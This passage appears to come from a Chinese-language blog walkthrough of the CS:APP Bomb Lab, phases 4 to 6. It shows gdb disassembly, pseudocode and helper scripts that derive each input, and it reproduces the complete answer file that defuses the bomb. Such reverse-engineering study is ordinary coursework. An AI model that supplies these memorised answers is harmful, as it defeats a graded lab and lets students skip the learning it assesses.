0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax</span><br><span class="line">   0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx</span><br><span class="line">   0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi</span><br><span class="line">   0x0000000000400ffe &lt;+48&gt;:    call   0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">   0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp</span><br><span class="line">   0x000000000040100b &lt;+61&gt;:    ret</span><br></pre></td></tr></table></figure>

<p><code>phase_4</code>对应伪代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">scanf(a, b)</span><br><span class="line"># 由这两行可知# 0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)</span><br><span class="line"># 0x0000000000401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt;</span><br><span class="line">0 &lt;= a &lt;= 12</span><br><span class="line"></span><br><span class="line">def func4(a, c, d):</span><br><span class="line">        e = d - c</span><br><span class="line">        sign = e shr 31</span><br><span class="line">        e = (e + sign) &gt;&gt; 1</span><br><span class="line"></span><br><span class="line">        f = (e + c)</span><br><span class="line">        if f &lt;= a:</span><br><span class="line">                e = 0</span><br><span class="line">                if f jge a:</span><br><span class="line">                        return e</span><br><span class="line">                else:</span><br><span class="line">                        c = f + 1</span><br><span class="line">                        return 2 * func4(a, c, d) + 1</span><br><span class="line">        else:</span><br><span class="line">                d = f - 1</span><br><span class="line">                return 2  * func4(a, c, d)</span><br><span class="line"></span><br><span class="line">r = func4(a, c, d)</span><br><span class="line">if 0 == r &amp;&amp; 0 == b:</span><br><span class="line">        defuse()</span><br></pre></td></tr></table></figure>

<p>利用python来求出a的值:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">a, c, d</span>):</span><br><span class="line">        e = d - c</span><br><span class="line">        <span class="keyword">if</span> e &lt; <span class="number">0</span>:</span><br><span class="line">                sign = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                sign = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        e = (e + sign) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        f = e + c</span><br><span class="line">        <span class="keyword">if</span> f &lt;= a:</span><br><span class="line">                e = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> f &gt;= a <span class="keyword">or</span> f &lt; <span class="number">0</span>:     <span class="comment"># 这里用的的jge来判断，由已知条件可知a一定大于等于0, 因condition写为这样       </span></span><br><span class="line">                    <span class="keyword">return</span> e</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        c = f + <span class="number">1</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="number">2</span> * func(a, c, d) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                d = f - <span class="number">1</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">2</span> * func(a, c, d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">        <span class="keyword">if</span> func(i, <span class="number">0</span>, <span class="number">14</span>) == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">myarch% python tmp.py</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">3</span><br><span class="line">7</span><br></pre></td></tr></table></figure>



<h3 id="Answer-3"><a href="#Answer-3" class="headerlink" title="Answer"></a>Answer</h3><ul>
<li><p>0 0</p>
</li>
<li><p>1 0</p>
</li>
<li><p>3 0</p>
</li>
<li><p>7 0</p>
</li>
</ul>
<h2 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase-5"></a>Phase-5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_5:</span><br><span class="line">=&gt; 0x0000000000401062 &lt;+0&gt;:     push   %rbx</span><br><span class="line">   0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp</span><br><span class="line">   0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx</span><br><span class="line">   0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax</span><br><span class="line">   0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)</span><br><span class="line">   0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax</span><br><span class="line">   0x000000000040107a &lt;+24&gt;:    call   0x40131b &lt;string_length&gt;</span><br><span class="line">   0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax</span><br><span class="line">   0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   0x0000000000401084 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">   0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)</span><br><span class="line">   0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx</span><br><span class="line">   0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx</span><br><span class="line">   0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">   0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">   0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax</span><br><span class="line">   0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax</span><br><span class="line">   0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)</span><br><span class="line">   0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi</span><br><span class="line">   0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi</span><br><span class="line">   0x00000000004010bd &lt;+91&gt;:    call   0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax</span><br><span class="line">   0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010c6 &lt;+100&gt;:   call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)</span><br><span class="line">   0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax</span><br><span class="line">   0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax</span><br><span class="line">   0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax</span><br><span class="line">   0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;</span><br><span class="line">   0x00000000004010e9 &lt;+135&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp</span><br><span class="line">   0x00000000004010f2 &lt;+144&gt;:   pop    %rbx</span><br><span class="line">   0x00000000004010f3 &lt;+145&gt;:   ret</span><br></pre></td></tr></table></figure>

<p>分析反汇编代码可知，该<code>phase</code>通过下面的方式来获取六个字符</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mask = <span class="number">0xf</span>;</span><br><span class="line">index = mask &amp; input[i];</span><br><span class="line">chr = $<span class="number">0x4024b0</span>[i]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/16x 0x4024b0</span><br><span class="line">0x4024b0 &lt;array.3449&gt;:  0x6d    0x61    0x64    0x75    0x69    0x65    0x72    0x73</span><br><span class="line">0x4024b8 &lt;array.3449+8&gt;:        0x6e    0x66    0x6f    0x74    0x76    0x62    0x79    0x6c</span><br></pre></td></tr></table></figure>

<p>只要这六个字符为<code>flyers</code>，即可通过该<code>phase</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">(gdb) x/s 0x40245e</span><br><span class="line">0x40245e:       &quot;flyers&quot;</span><br></pre></td></tr></table></figure>

<p>因此可以写一个C语言脚本来获取对应的正确字符</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OFFSET 0x30</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> arr[<span class="number">6</span>] = &#123;<span class="number">9</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, arr[i] + OFFSET);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">myarch% gcc tmp.c</span><br><span class="line">myarch% ./a.out </span><br><span class="line">9?&gt;567                                                     </span><br></pre></td></tr></table></figure>



<h3 id="Answer-4"><a href="#Answer-4" class="headerlink" title="Answer"></a>Answer</h3><ul>
<li>)&#x2F;.%&amp;’ </li>
<li>9?&gt;567 </li>
<li>IONEFG </li>
<li>Y_^UVW </li>
<li>ionefg </li>
<li>y~uvw</li>
</ul>
<h2 id="Phase-6"><a href="#Phase-6" class="headerlink" title="Phase-6"></a>Phase-6</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_6:</span><br><span class="line">=&gt; 0x00000000004010f4 &lt;+0&gt;:     push   %r14</span><br><span class="line">   0x00000000004010f6 &lt;+2&gt;:     push   %r13</span><br><span class="line">   0x00000000004010f8 &lt;+4&gt;:     push   %r12</span><br><span class="line">   0x00000000004010fa &lt;+6&gt;:     push   %rbp</span><br><span class="line">   0x00000000004010fb &lt;+7&gt;:     push   %rbx</span><br><span class="line">   0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp</span><br><span class="line">   0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13</span><br><span class="line">   0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi</span><br><span class="line">   0x0000000000401106 &lt;+18&gt;:    call   0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14</span><br><span class="line">   0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d</span><br><span class="line">   0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp</span><br><span class="line">   0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax</span><br><span class="line">   0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax</span><br><span class="line">   0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax</span><br><span class="line">   0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;		// jbe可以看出$eax-1必须大于等于0即读取到的数字必须大于等于0</span><br><span class="line">   0x0000000000401123 &lt;+47&gt;:    call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d</span><br><span class="line">   0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d</span><br><span class="line">   0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;</span><br><span class="line">   0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx</span><br><span class="line">   0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax</span><br><span class="line">   0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax</span><br><span class="line">   0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)</span><br><span class="line">   0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;</span><br><span class="line">   0x0000000000401140 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx</span><br><span class="line">   0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx</span><br><span class="line">   0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;</span><br><span class="line">   0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13</span><br><span class="line">   0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;</span><br><span class="line">   0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi</span><br><span class="line">   0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax</span><br><span class="line">   0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx</span><br><span class="line">   0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx</span><br><span class="line">   0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx</span><br><span class="line">   0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)</span><br><span class="line">   0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax</span><br><span class="line">   0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax</span><br><span class="line">   0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;</span><br><span class="line">   0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi</span><br><span class="line">   0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;</span><br><span class="line">   0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx</span><br><span class="line">   0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax</span><br><span class="line">   0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax</span><br><span class="line">   0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">   0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line">   0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx</span><br><span class="line">   0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">   0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi</span><br><span class="line">   0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi</span><br><span class="line">   0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;</span><br><span class="line">   0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">   0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx</span><br><span class="line">   0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;</span><br><span class="line">   0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax</span><br><span class="line">   0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx</span><br><span class="line">   0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">   0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx</span><br><span class="line">   0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax</span><br><span class="line">   0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi</span><br><span class="line">   0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx</span><br><span class="line">   0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx</span><br><span class="line">   0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)</span><br><span class="line">   0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax</span><br><span class="line">   0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax</span><br><span class="line">   0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;</span><br><span class="line">   0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx</span><br><span class="line">   0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;</span><br><span class="line">   0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)</span><br><span class="line">   0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp</span><br><span class="line">   0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax</span><br><span class="line">   0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax</span><br><span class="line">   0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)</span><br><span class="line">   0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;</span><br><span class="line">   0x00000000004011e9 &lt;+245&gt;:   call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx</span><br><span class="line">   0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp</span><br><span class="line">   0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;</span><br><span class="line">   0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp</span><br><span class="line">   0x00000000004011fb &lt;+263&gt;:   pop    %rbx</span><br><span class="line">   0x00000000004011fc &lt;+264&gt;:   pop    %rbp</span><br><span class="line">   0x00000000004011fd &lt;+265&gt;:   pop    %r12</span><br><span class="line">   0x00000000004011ff &lt;+267&gt;:   pop    %r13</span><br><span class="line">   0x0000000000401201 &lt;+269&gt;:   pop    %r14</span><br><span class="line">   0x0000000000401203 &lt;+271&gt;:   ret</span><br></pre></td></tr></table></figure>

<p><code>phase_6</code>首先获取6个用户输入的数字，并确保这六个数字不同且都满足<code>1 &lt;= num &lt;= 6</code></p>
<p>然后对每个数字<code>num</code>进行<code>num = 7 - num</code>的处理，并根据处理后的数组中索引从小到大对应的值来从头节点开始排列<code>0x6032d0</code>处的<code>node</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x6032d0 &lt;node1&gt;:       0x4c    0x01    0x00    0x00    0x01    0x00    0x00    0x00</span><br><span class="line">0x6032d8 &lt;node1+8&gt;:     0xe0    0x32    0x60    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x6032e0 &lt;node2&gt;:       0xa8    0x00    0x00    0x00    0x02    0x00    0x00    0x00</span><br><span class="line">0x6032e8 &lt;node2+8&gt;:     0xf0    0x32    0x60    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x6032f0 &lt;node3&gt;:       0x9c    0x03    0x00    0x00    0x03    0x00    0x00    0x00</span><br><span class="line">0x6032f8 &lt;node3+8&gt;:     0x00    0x33    0x60    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x603300 &lt;node4&gt;:       0xb3    0x02    0x00    0x00    0x04    0x00    0x00    0x00</span><br><span class="line">0x603308 &lt;node4+8&gt;:     0x10    0x33    0x60    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x603310 &lt;node5&gt;:       0xdd    0x01    0x00    0x00    0x05    0x00    0x00    0x00</span><br><span class="line">0x603318 &lt;node5+8&gt;:     0x20    0x33    0x60    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x603320 &lt;node6&gt;:       0xbb    0x01    0x00    0x00    0x06    0x00    0x00    0x00</span><br><span class="line">0x603328 &lt;node6+8&gt;:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br></pre></td></tr></table></figure>

<p><code>node</code>结构体由<code>value</code>, <code>order</code>, <code>next_node_ptr</code>组成</p>
<p>最后从头节点开始，依次与<code>next_node_ptr</code>指向的<code>node</code>的<code>value</code>比较，只要使得每一个<code>node</code>的<code>value</code>都大于等于<code>next_node_ptr</code>指向的<code>node</code>的<code>value</code>，即可避免<code>explode_boom</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp</span><br><span class="line">0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax</span><br><span class="line">0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax</span><br><span class="line">0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)</span><br><span class="line">0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;</span><br><span class="line">0x00000000004011e9 &lt;+245&gt;:   call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx</span><br><span class="line">0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp</span><br><span class="line">0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;</span><br></pre></td></tr></table></figure>



<h3 id="Answer-5"><a href="#Answer-5" class="headerlink" title="Answer"></a>Answer</h3><ul>
<li>4 3 2 1 6 5</li>
</ul>
<h2 id="Summarize-1"><a href="#Summarize-1" class="headerlink" title="Summarize"></a>Summarize</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">myarch% ./bomb answers.txt</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">That&#x27;s number 2.  Keep going!</span><br><span class="line">Halfway there!</span><br><span class="line">So you got that one.  Try this one.</span><br><span class="line">Good work!  On to the next...</span><br><span class="line">Congratulations! You&#x27;ve defused the bomb!</span><br></pre></td></tr></table></figure>

<p><strong>Answer:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">myarch% cat answers.txt   </span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">0 207</span><br><span class="line">0 0</span><br><span class="line">9?&gt;567</span><br><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure>



<h1 id="3-AttackLab"><a href="#3-AttackLab" class="headerlink" title="3. AttackLab"></a>3. AttackLab</h1><p><strong>Introduction:</strong> <a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">The Attack Lab: Understanding Buffer Overflow Bugs</a></p>
<p><strong>DirectoryLayout:</strong></p>
